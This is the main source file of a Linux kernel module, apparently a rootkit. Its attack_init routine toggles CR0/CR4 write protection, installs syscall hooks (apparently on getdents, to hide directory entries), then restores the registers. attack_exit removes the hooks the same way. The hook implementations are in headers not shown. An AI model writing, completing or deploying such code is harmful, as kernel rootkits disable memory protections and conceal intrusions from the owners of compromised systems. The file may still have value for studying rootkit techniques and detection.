#include "main.h"
#include "cr.h"
#include "getdents.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ramon Martins"); 

static char *lkm_name = "blah";

static int __init attack_init(void)
{ 
    printk(KERN_ALERT "Module name is: %s\n", lkm_name);
    init_cr0();
    init_cr4();
    SetHooks();
    revert_cr0();
    revert_cr4();
    return 0;
}


static void __exit attack_exit(void)
{
    init_cr0();
    init_cr4();
    HookCleanup();
    revert_cr0();
    revert_cr4();
    printk(KERN_ALERT "Exit Attack\n"); 
}


module_init(attack_init);
module_exit(attack_exit); 
